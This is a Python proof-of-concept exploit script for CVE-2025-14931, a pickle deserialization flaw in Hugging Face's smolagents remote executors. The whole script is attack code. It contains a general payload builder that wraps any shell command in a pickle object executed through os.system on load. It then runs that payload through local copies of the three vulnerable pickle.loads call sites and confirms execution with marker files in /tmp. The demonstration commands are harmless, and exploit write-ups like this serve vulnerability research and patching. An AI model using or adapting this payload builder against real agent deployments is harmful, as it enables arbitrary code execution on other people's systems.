#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : smolagents Pickle Deserialization — All 3 Code Paths
# CVE            : CVE-2025-14931
# Vendor         : Hugging Face
# Product        : smolagents
# Affected       : v1.10.0 through v1.24.0
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 10.0 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-12-23
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
smolagents Pickle Deserialization — Direct Proof (All 3 Vulnerable Code Paths)

Demonstrates the root cause vulnerability WITHOUT the WebSocket/network layer.
Directly reproduces the exact code pattern from all three pickle.loads()
callsites in smolagents remote_executors.py.

ATTACK CHAIN:
  1. Construct malicious pickle payload using __reduce__ → os.system()
  2. Simulate WebSocket executor path (line 309) — pickle.loads()
  3. Simulate E2B executor path (line 194) — pickle.loads()
  4. Simulate Wasm executor path (line 969) — pickle.loads()
  5. Verify RCE by checking marker files

PREREQUISITES:
  - Python 3 (stdlib only — no external dependencies)

REFERENCES:
  - CVE-2025-14931
  - https://www.zerodayinitiative.com/advisories/ZDI-25-1143/
  - https://github.com/advisories/GHSA-q9r5-6hrr-9ph7
"""

import base64
import os
import pickle
import sys

MARKER = "/tmp/poc_vector2_pwned"


def banner():
    print("=" * 70)
    print("  CVE-2025-14931 — Vector 2: Direct Pickle Deserialization Proof")
    print("  Demonstrates the root cause without network interaction")
    print("=" * 70)
    print()


def clean_marker():
    if os.path.exists(MARKER):
        os.remove(MARKER)
        print(f"[*] Cleaned old marker: {MARKER}")


def create_malicious_payload(command: str) -> str:
    """
    Create a base64-encoded malicious pickle payload.

    This is the same payload format that a malicious Jupyter Kernel Gateway
    (or compromised sandbox) would return as the evalue of a
    FinalAnswerException error message.

    The payload uses pickle's __reduce__ protocol to execute arbitrary
    commands during deserialization.
    """
    class RCE:
        def __reduce__(self):
            return (os.system, (command,))

    raw_pickle = pickle.dumps(RCE())
    b64_payload = base64.b64encode(raw_pickle).decode("ascii")
    return b64_payload


def simulate_websocket_path(malicious_evalue: str) -> bool:
    """
    Simulate the vulnerable code path from _websocket_run_code_raise_errors()
    at line 309 of remote_executors.py.

    This is the EXACT code pattern:
        msg_content = msg.get("content", {})
        if msg_content.get("ename", "") == RemotePythonExecutor.FINAL_ANSWER_EXCEPTION:
            result = pickle.loads(base64.b64decode(msg_content.get("evalue", "")))
    """
    print("[2a] Simulating WebSocket executor path (line 309):")
    print("     DockerExecutor / ModalExecutor / BlaxelExecutor")

    # Simulate the WebSocket message structure
    msg = {
        "parent_header": {"msg_id": "test-msg-001"},
        "msg_type": "error",
        "header": {"msg_type": "error"},
        "content": {
            "ename": "FinalAnswerException",
            "evalue": malicious_evalue,
            "traceback": ["FinalAnswerException: <pickled>"],
        },
    }

    msg_content = msg.get("content", {})

    # This is the check smolagents does before calling pickle.loads
    FINAL_ANSWER_EXCEPTION = "FinalAnswerException"
    if msg_content.get("ename", "") == FINAL_ANSWER_EXCEPTION:
        print("     [+] ename == 'FinalAnswerException' — entering vulnerable branch")
        print("     [*] Calling: pickle.loads(base64.b64decode(evalue))")
        print("     [*] >>> THIS IS THE VULNERABLE LINE (remote_executors.py:309) <<<")

        # ---- THE VULNERABLE LINE ----
        result = pickle.loads(base64.b64decode(msg_content.get("evalue", "")))
        # ---- END VULNERABLE LINE ----

        print(f"     [+] pickle.loads returned: {result} (os.system exit code)")
        return True

    return False


def simulate_e2b_path(malicious_evalue: str) -> bool:
    """
    Simulate the vulnerable code path from E2BExecutor.run_code_raise_errors()
    at line 194 of remote_executors.py.

    Exact pattern:
        if execution.error.name == RemotePythonExecutor.FINAL_ANSWER_EXCEPTION:
            final_answer = pickle.loads(base64.b64decode(execution.error.value))
    """
    print("[2b] Simulating E2B executor path (line 194):")

    # Simulate the E2B execution error structure
    class FakeError:
        name = "FinalAnswerException"
        value = malicious_evalue

    class FakeExecution:
        error = FakeError()

    execution = FakeExecution()
    FINAL_ANSWER_EXCEPTION = "FinalAnswerException"

    if execution.error.name == FINAL_ANSWER_EXCEPTION:
        print("     [+] error.name == 'FinalAnswerException' — entering vulnerable branch")
        print("     [*] Calling: pickle.loads(base64.b64decode(execution.error.value))")
        print("     [*] >>> THIS IS THE VULNERABLE LINE (remote_executors.py:194) <<<")

        # ---- THE VULNERABLE LINE ----
        final_answer = pickle.loads(base64.b64decode(execution.error.value))
        # ---- END VULNERABLE LINE ----

        print(f"     [+] pickle.loads returned: {final_answer}")
        return True

    return False


def simulate_wasm_path(malicious_evalue: str) -> bool:
    """
    Simulate the vulnerable code path from WasmExecutor.run_code_raise_errors()
    at line 969 of remote_executors.py.

    Exact pattern:
        if error.get("pythonExceptionType") == RemotePythonExecutor.FINAL_ANSWER_EXCEPTION
            and "pythonExceptionValue" in error:
            result = pickle.loads(base64.b64decode(error["pythonExceptionValue"]))
    """
    print("[2c] Simulating Wasm executor path (line 969):")

    # Simulate the Wasm response error structure
    error = {
        "pythonExceptionType": "FinalAnswerException",
        "pythonExceptionValue": malicious_evalue,
    }

    FINAL_ANSWER_EXCEPTION = "FinalAnswerException"

    if (
        error.get("pythonExceptionType") == FINAL_ANSWER_EXCEPTION
        and "pythonExceptionValue" in error
    ):
        print("     [+] pythonExceptionType == 'FinalAnswerException' — entering vulnerable branch")
        print("     [*] Calling: pickle.loads(base64.b64decode(error['pythonExceptionValue']))")
        print("     [*] >>> THIS IS THE VULNERABLE LINE (remote_executors.py:969) <<<")

        # ---- THE VULNERABLE LINE ----
        result = pickle.loads(base64.b64decode(error["pythonExceptionValue"]))
        # ---- END VULNERABLE LINE ----

        print(f"     [+] pickle.loads returned: {result}")
        return True

    return False


def main():
    banner()
    clean_marker()

    # ---------- Step 1: Craft the malicious payload ----------
    command = f"touch {MARKER} && echo CVE-2025-14931-VECTOR2 > {MARKER}"
    print(f"[1] Crafting malicious pickle payload:")
    print(f"    Command: {command}")

    payload = create_malicious_payload(command)
    print(f"    Payload (base64, {len(payload)} chars): {payload[:60]}...")
    print()

    # ---------- Step 2: Trigger all three vulnerable code paths ----------
    # Each uses a NEW unique marker to prove independent execution
    results = []

    # Vector 2a: WebSocket path (DockerExecutor/ModalExecutor/BlaxelExecutor)
    results.append(("WebSocket (line 309)", simulate_websocket_path(payload)))
    print()

    # Vector 2b: E2B path — use a different marker to confirm independent RCE
    marker_e2b = "/tmp/poc_vector2_e2b"
    if os.path.exists(marker_e2b):
        os.remove(marker_e2b)
    payload_e2b = create_malicious_payload(f"touch {marker_e2b}")
    results.append(("E2B (line 194)", simulate_e2b_path(payload_e2b)))
    print()

    # Vector 2c: Wasm path — use yet another marker
    marker_wasm = "/tmp/poc_vector2_wasm"
    if os.path.exists(marker_wasm):
        os.remove(marker_wasm)
    payload_wasm = create_malicious_payload(f"touch {marker_wasm}")
    results.append(("Wasm (line 969)", simulate_wasm_path(payload_wasm)))
    print()

    # ---------- Step 3: Verify RCE ----------
    print("[3] Verifying RCE — checking marker files:")
    all_confirmed = True

    for marker_path, label in [
        (MARKER, "WebSocket path"),
        (marker_e2b, "E2B path"),
        (marker_wasm, "Wasm path"),
    ]:
        if os.path.exists(marker_path):
            print(f"    [!!!] {marker_path} EXISTS — {label} RCE confirmed!")
        else:
            print(f"    [ ] {marker_path} not found — {label} RCE not confirmed")
            all_confirmed = False

    # ---------- Step 4: Verdict ----------
    print()
    print("=" * 70)
    if all_confirmed:
        print("  RESULT: ALL THREE VULNERABLE CODE PATHS CONFIRMED")
        print()
        print("  pickle.loads(base64.b64decode(...)) in smolagents executes")
        print("  arbitrary code when processing FinalAnswerException responses.")
        print()
        print("  Affected code paths:")
        print("    - remote_executors.py:194  (E2BExecutor)")
        print("    - remote_executors.py:309  (DockerExecutor/ModalExecutor/BlaxelExecutor)")
        print("    - remote_executors.py:969  (WasmExecutor)")
    else:
        print("  RESULT: PARTIAL — some paths did not trigger")
    print("=" * 70)

    return all_confirmed


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
